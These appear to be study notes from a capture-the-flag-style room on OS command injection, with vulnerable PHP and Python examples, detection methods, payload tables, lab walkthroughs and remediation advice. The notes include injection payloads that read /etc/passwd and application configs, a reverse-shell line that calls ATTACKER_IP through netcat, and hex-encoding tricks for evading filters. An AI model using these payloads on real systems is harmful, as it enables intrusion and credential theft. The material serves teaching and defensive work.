# Command Injection

## Overview

Command injection occurs when user input is incorporated into an OS-level command that is executed by the server, without proper validation or sanitisation. The injected commands run with the same privileges as the web application process — giving attackers direct access to the underlying operating system. This room covers how command injection arises in PHP and Python code, how to detect both verbose and blind variants, useful exploitation payloads, and how to prevent the vulnerability.

**Main objectives:** Understand the code patterns that lead to command injection, detect both verbose and blind variants, exploit a vulnerable application using shell operators to retrieve a flag.

**Skills introduced:** Shell operators for command chaining (`;`, `&`, `&&`, `|`), verbose vs blind injection detection, time-based blind detection (`ping`, `sleep`), output redirection for blind injection, curl-based payload delivery, server privilege enumeration (`whoami`, `ls`, `dir`), client-side validation bypass, PHP input sanitisation patterns, and hex encoding for filter evasion.

---

## Concepts Covered

### What Is Command Injection?

**Definition:** Command injection (OWASP A05: Injection, CWE-78) occurs when user-supplied input flows into an OS command execution function without sanitisation. The attacker appends additional OS commands to the legitimate input.

**Distinction from RCE:** Command injection is a specific technique for achieving Remote Code Execution (RCE). RCE is the broader outcome; command injection is one path to that outcome (others include deserialization vulnerabilities, memory corruption, and SSTI).

**Privilege context:** Injected commands inherit the web server process's privileges. If Apache runs as `www-data`, injected commands run as `www-data`. If the application runs as root (a misconfiguration), injected commands run as root.

---

### How It Arises — PHP Example

```php
$songs = "/var/www/html/songs";
if (isset($_GET["title"])) {
    $title = $_GET["title"];                                    // User input, unsanitised
    $command = "grep $title /var/www/html/songtitle.txt";       // Input concatenated into command
    $search = exec($command);                                   // Command executed
    ...
}
```

**Normal request:** `?title=Yesterday`
```bash
grep Yesterday /var/www/html/songtitle.txt
```

**Injected request:** `?title=; cat /etc/passwd`
```bash
grep ; cat /etc/passwd /var/www/html/songtitle.txt
```

The semicolon `;` is a shell command separator. The shell sees two commands: `grep` (which fails silently) and `cat /etc/passwd` (which executes and returns the file contents). The developer intended only one command; the attacker ran two.

**PHP functions enabling command injection:**
- `exec()` — executes and returns the last line of output
- `system()` — executes and outputs the result
- `shell_exec()` — executes and returns all output as a string
- `passthru()` — executes and passes raw output directly to browser

None of these functions are inherently dangerous. They become vulnerabilities when user input reaches them without sanitisation.

---

### How It Arises — Python Example

```python
import subprocess
from flask import Flask

app = Flask(__name__)

def execute_command(shell):
    return subprocess.Popen(shell, shell=True, stdout=subprocess.PIPE).stdout.read()

@app.route('/<shell>')
def command_server(shell):
    return execute_command(shell)
```

Visiting `http://flaskapp.thm/whoami` executes `whoami` and returns the result. The URL path is passed directly to `subprocess.Popen` with `shell=True`. This is an extreme example — the application is essentially a web-accessible terminal — but it illustrates the core pattern: user input reaching a shell execution function without restriction.

The principle applies across Python, Node.js (`child_process.exec()`), Java (`Runtime.exec()`), Ruby (`system()`), and any other language that exposes OS command execution.

---

### Verbose vs Blind Command Injection

**Verbose:** The output of the injected command is returned in the HTTP response. The attacker can read results directly.

**Blind:** The command executes on the server, but the application does not return its output. The page looks identical regardless of whether the injection succeeded. Detection requires indirect signals.

#### Detecting Blind Command Injection

**Time-based detection (most reliable):**

```bash
# Linux: ping loopback 10 times — should take ~10 seconds
; ping -c 10 127.0.0.1

# Linux: sleep for 5 seconds
; sleep 5

# Windows: equivalent of sleep
; timeout /T 5
```

If the HTTP response takes roughly as long as the specified delay, the command executed. The response time scales with the ping count or sleep duration — confirming execution.

**Output redirection to web-accessible file:**
```bash
; whoami > /var/www/html/output.txt
```
Then browse to `http://target.thm/output.txt`. If the file exists and contains the username, blind injection is confirmed and output exfiltration via file is available.

**curl callback (OOB):**
```bash
curl http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami
```
Send the injection payload via curl for precise control over the exact bytes transmitted. Useful when browser encoding or form validation interferes with special characters.

---

### Shell Operators for Command Chaining

| Operator | Behaviour | Example |
|----------|-----------|---------|
| `;` | Execute second command regardless of first's result | `cmd1 ; cmd2` |
| `&` | Run second command in background alongside first | `cmd1 & cmd2` |
| `&&` | Execute second command only if first succeeds | `cmd1 && cmd2` |
| `\|` | Pipe output of first as input to second | `cmd1 \| cmd2` |
| `\|\|` | Execute second command only if first fails | `cmd1 \|\| cmd2` |

For command injection, `;` and `&` are the most reliable because they do not depend on the result of the legitimate command.

---

### Useful Payloads

**Linux:**

| Payload | Purpose |
|---------|---------|
| `; whoami` | Identify the application's running user |
| `; id` | More detail than whoami — includes UID and groups |
| `; ls` | List directory contents (config files, credentials, app files) |
| `; cat /etc/passwd` | Read user account list |
| `; cat /home/user/flag.txt` | Read target file |
| `; ping -c 5 127.0.0.1` | Time-based blind injection confirmation |
| `; sleep 5` | Alternative time-based blind confirmation |
| `; nc -e /bin/sh ATTACKER_IP PORT` | Reverse shell (if netcat with -e is available) |

**Windows:**

| Payload | Purpose |
|---------|---------|
| `& whoami` | Identify running user |
| `& dir` | List directory contents |
| `& ping -n 5 127.0.0.1` | Time-based blind confirmation |
| `& timeout /T 5` | Alternative time-based blind confirmation |

---

## Methodology

```
1. Identify all input fields that might influence server-side commands:
   - Ping/traceroute utilities
   - File conversion tools
   - Image processing features
   - Search functionality over local files
   - Any feature that clearly interacts with the OS

2. Submit normal input — understand expected behaviour

3. Test verbose detection:
   - Append ; whoami to the input
   - If username appears in response → verbose injection confirmed

4. Test blind detection (if no visible output):
   - Append ; sleep 5
   - If response takes ~5 seconds longer → blind injection confirmed
   - Alternative: ; ping -c 5 127.0.0.1 and measure response time

5. Enumerate the environment:
   - whoami — what user am I running as?
   - id — group memberships, UID
   - ls / dir — what files are in the working directory?

6. Read target files:
   - cat /etc/passwd (Linux credentials/users)
   - cat /var/www/html/config.php (app credentials)
   - cat /home/tryhackme/flag.txt (target files)

7. If filters block plaintext:
   - Try hex encoding: \x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64 = /etc/passwd
   - Try alternative command syntax
   - Try different shell operators (& vs ;)
```

---

## Practical Activities

### Activity 1 — Identify the Running User

**Objective:** Determine what system user the web application is running as.

**Input field:** A web form that takes user input and passes it to a system command.

**Payload:**
```
input_value ; whoami
```
or
```
input_value & whoami
```

**Finding:** The response includes the output of `whoami`, confirming verbose command injection and revealing the application's process user.

---

### Activity 2 — Read the Flag File

**Objective:** Read `/home/tryhackme/flag.txt` using command injection.

**Payload:**
```
input_value & cat /home/tryhackme/flag.txt
```

**Finding:** The contents of the flag file are returned in the response, demonstrating full file read capability via command injection.

**Why `&` instead of `;`:** Either works here. `&` backgrounds the legitimate command and runs the injected command, while `;` sequences them. Both produce the desired output in a verbose injection context.

---

## Observations and Analysis

- PHP `exec()`, `system()`, `passthru()`, `shell_exec()` are safe only when user input never reaches them — the function itself is not the vulnerability
- `subprocess.Popen(user_input, shell=True)` in Python is equally dangerous — the `shell=True` flag means the input is passed through a shell, enabling operator interpretation
- Client-side validation (HTML `pattern` attribute) can be bypassed by sending requests directly via curl or Burp Suite — never rely on client-side checks alone
- `whoami` and `id` are consistently the first payloads to run after confirming injection — privilege awareness shapes all subsequent decisions
- Time-based blind detection is reliable but network latency can introduce false positives — use longer delays (10+ seconds) and test consistently
- Hex encoding bypasses filters that check for literal strings but not for encoded equivalents — defence in depth matters

---

## Remediation

**Avoid dangerous functions where possible:** If OS commands are not needed, do not use them.

**Client-side validation as first layer (not a security control):**
```html
<input type="text" pattern="[0-9]+" name="ping">
```
Restricts form input to digits. However, bypassed by any direct HTTP request — must be backed by server-side validation.

**Server-side input validation:**
```php
if (!filter_input(INPUT_GET, "number", FILTER_VALIDATE_NUMBER)) {
    // Reject invalid input
}
```
`filter_input()` validates against the expected type. All other input is rejected before reaching `exec()`.

**Allowlisting — most secure approach:**
```php
$allowed_targets = ['127.0.0.1', '8.8.8.8'];
if (in_array($_GET['target'], $allowed_targets)) {
    exec("ping -c 1 " . escapeshellarg($_GET['target']));
}
```

**`escapeshellarg()`:** Wraps input in single quotes and escapes existing single quotes. Prevents shell operator interpretation. Use when dynamic OS commands are unavoidable.

**Filter bypass awareness:** Attackers can evade string-based filters using hex encoding, character substitution, or alternative syntax. Defence in depth (multiple validation layers + least privilege) is more reliable than any single filter.

---

## Tools and Technologies Used

### curl
- **Purpose:** Command-line HTTP client for crafting precise requests with URL-encoded payloads
- **Common usage:** `curl 'http://target/process.php%3Fsearch%3DInput%3B%20whoami'`
- **In this room:** Sending injection payloads with full control over encoding and request format

### Browser DevTools
- **Purpose:** Observing command output returned in HTTP responses (verbose injection)
- **How used:** View response bodies for injected command output

---

## Key Learnings

- Command injection = user input reaching OS command execution functions without sanitisation
- Shell operators (`;`, `&`, `&&`, `|`) chain additional commands onto legitimate ones
- Verbose: output visible in response; Blind: need time delays or OOB to confirm
- `; whoami` and `; id` are the first payloads after confirmation
- Client-side HTML validation is bypassed by direct HTTP requests — server-side validation is mandatory
- `escapeshellarg()` prevents shell operator interpretation when OS commands are unavoidable
- Hex encoding bypasses string-literal filters: `\x2f` = `/`, enabling `/etc/passwd` as `\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64`
- Injected commands run as the web application process user — escalation depends on that user's permissions

---

## Things Worth Remembering

- Separator operators: `;` (always), `&&` (if first succeeds), `||` (if first fails), `&` (background)
- Verbose test: `; whoami` visible in response → confirmed verbose injection
- Blind test: `; sleep 5` — measure response time → delay confirms blind injection
- File read: `; cat /etc/passwd`, `; cat /home/user/flag.txt`
- Output to file: `; whoami > /var/www/html/output.txt` → browse to output.txt
- Windows equivalents: `& dir`, `& timeout /T 5`
- Hex bypass: `\x2f` = `/`, useful for `/etc/passwd` in sanitised contexts
- PHP safe patterns: `escapeshellarg()` for arguments, `escapeshellcmd()` for full commands, `filter_input()` for type validation

---

## Conclusion

Command injection demonstrates the consequence of trusting user input at the OS boundary. The vulnerability is conceptually simple but operationally impactful — the attacker gains direct shell access through what appears to be a legitimate application feature. Both PHP and Python examples show that the vulnerability is language-agnostic; the pattern of user input flowing to a shell execution function is what matters. The methodical approach — normal input first, verbose test, blind test if needed, enumeration, target file reading — provides a structured workflow applicable to any application that makes OS-level calls.
